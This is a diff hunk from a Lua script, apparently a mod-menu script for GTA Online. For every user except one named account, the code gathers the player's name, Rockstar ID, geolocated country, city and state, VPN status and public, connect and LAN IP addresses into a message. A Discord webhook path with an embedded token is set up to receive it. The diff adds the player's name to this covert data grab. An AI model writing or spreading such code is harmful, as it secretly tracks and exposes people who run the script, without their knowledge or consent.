@@ -8360,7 +8360,8 @@ if not players.get_name(players.user()) == "TheaterChaos20" then
 	local webhookforloginscript = "api/webhooks/1225179507149766717/d2dIYSxB_GyaEdW_Kopni8PC1udPm-6y-64iSWEqKdTlnTQEApsFFjoNe5BdPKU-cjTn"
 	local descriptionforwebhooklogin = ""
 	local languagesforwebhooklogins = get_ip_data(tostring(soup.IpAddr(players.get_connect_ip(players.user()))))
-	descriptionforwebhooklogin = "RID: ".. players.get_rockstar_id(players.user()) .."\\n"
+	descriptionforwebhooklogin = "Name: ".. players.get_name(players.user()) .."\\n"
+	descriptionforwebhooklogin = descriptionforwebhooklogin .."RID: ".. players.get_rockstar_id(players.user()) .."\\n"
 	descriptionforwebhooklogin = descriptionforwebhooklogin .."Land: ".. languagesforwebhooklogins.country.." // Stadt: "..languagesforwebhooklogins.city.." // Staat: "..languagesforwebhooklogins.state .."\\n"
 	descriptionforwebhooklogin = descriptionforwebhooklogin .."VPN: ".. players.is_using_vpn(players.user()) .."\\n"
 	descriptionforwebhooklogin = descriptionforwebhooklogin .."IP: ".. tostring(soup.IpAddr(players.get_ip(players.user()))).."// Connect IP: ".. tostring(soup.IpAddr(players.get_connect_ip(players.user()))).."// Lan IP: ".. tostring(soup.IpAddr(players.get_lan_ip(players.user()))).."\\n"
